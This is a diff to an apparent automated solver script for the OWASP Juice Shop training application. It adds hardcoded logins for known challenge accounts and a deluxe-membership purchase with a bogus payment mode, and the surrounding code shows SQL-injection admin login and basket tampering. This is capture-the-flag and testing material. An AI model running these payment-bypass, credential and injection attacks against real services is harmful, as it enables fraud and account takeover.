@@ -119,6 +119,30 @@ def _basket_manipulate(c):
         c.put("/api/BasketItems/%s" % iid, headers=H, json={"BasketId": 1 if str(bid) != "1" else 2})  # Manipulate Basket
 
 
+def _known_login_challenges(c):
+    # pre-login solveIf checks fire on the EXACT submitted email+password (single known value
+    # each, straight from the app's source — never an iterated list).
+    for email, pw in (("support@juice-sh.op", "J6aVjTgOpRs@?5l!Zkq2AYnCE@RF$P"),   # Login Support Team
+                      ("amy@juice-sh.op", "K1f....................."),              # Login Amy
+                      ("bjoern.kimminich@gmail.com", "bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI="),  # Login Bjoern (OAuth)
+                      ("testing@juice-sh.op", "IamUsedForTesting"),                 # Exposed Credentials
+                      ("J12934@juice-sh.op", "0Y8rMnww$*9VFYE§59-!Fg1L6t&6lB")):  # Password Spraying cred
+        try:
+            _login(c, email, pw)
+        except Exception:
+            pass
+
+
+def _deluxe_fraud(c):
+    # become a deluxe member with a paymentMode that is neither 'wallet' nor 'card'
+    email = "dlx_%s@x.io" % id(c)
+    _register(c, email, _PW)
+    a = _login(c, email, _PW)
+    if a.get("token"):
+        c.post("/rest/deluxe-membership", headers={"Authorization": "Bearer " + a["token"]},
+               json={"paymentMode": "none"})
+
+
 def _beacon_visits(c):
     # "visit X" challenges are detected server-side by a GET to a padding-pixel / asset URL
     for p in ("/assets/public/images/padding/19px.png",   # Admin Section
@@ -166,8 +190,8 @@ def solve(base_url: str) -> dict:
         before = _board(c)
         admin = _login(c, _ADMIN_SQLI, "x")
         AH = {"Authorization": "Bearer %s" % admin.get("token")} if admin.get("token") else {}
-        for step in (_sqli_logins, _known_cred_logins, _registrations, _resets,
-                     _beacon_visits, _uploads, _basket_manipulate):
+        for step in (_sqli_logins, _known_cred_logins, _known_login_challenges, _registrations,
+                     _resets, _beacon_visits, _uploads, _basket_manipulate, _deluxe_fraud):
             try:
                 step(c)
             except Exception:
